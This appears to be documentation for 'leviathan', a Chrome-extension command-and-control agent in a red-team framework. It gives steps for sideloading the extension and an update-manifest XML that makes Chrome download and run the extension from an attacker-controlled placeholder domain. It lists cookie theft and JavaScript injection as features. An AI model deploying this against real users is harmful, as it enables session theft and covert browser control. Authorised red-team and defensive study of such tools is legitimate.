+++
title = "leviathan"
chapter = false
weight = 5
+++
![logo](/agents/leviathan/leviathan.svg?width=200px)
## Summary
The leviathan agent is a Chrome browser extension that leverages the websockets protocol for C2. To use this payload:
1. Create the payload the UI. This will create a .zip file for you to download and extract.
2. In Google Chrome, click the hamburger icon on the right -> More Tools -> Extensions
3. Click the top right toggle for developer mode
4. Drag the extension.crx file onto the extensions page in Chrome to get a popup about adding the extension
5. Click "Add extension"
6. The extension will now be listed with an `ID: string here` such as (`ID: cmpdmiiigdgpigikmenkkobfkcbnpgij`)
{{% notice info %}}
For local testing, you can select to "Load unpacked" and point to the `extension` folder. It'll load and run your extension locally.
{{% /notice %}}
At this point, you need to deploy it in operations. This is very OS and operation specific. In general, you're looking at steps 13 and 14 from @xorrior's original [blog](https://posts.specterops.io/no-place-like-chrome-122e500e421f).

When building the payload in Mythic, you specify the path of where the manifest is going to live, like `https://mydomain.com/manifest.xml`. Chrome is going to reach out to this url to get some information and the actual extension. The xml file looks like this (you will need to generate this):

```
<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
 <app appid='jadlkkknjobkmjcnddmbdmjhndcochdg'>
 <updatecheck codebase='http://mydomain.com/extension.crx' version='1.0' />
 </app>
</gupdate>
```

Make sure that the version specified here matches the version you specified when generating your payload. You can use this to your advantage to "announce" a new version that Chrome should pull down and run.

### Highlighted Agent Features

- Capture screenshots
- Steal cookies
- View open tabs
- Inject javascript into tabs
- Dynamically load new commands

## Authors

@xorrior

### Special Thanks to These Contributors

@sixdub for the idea and PoC code
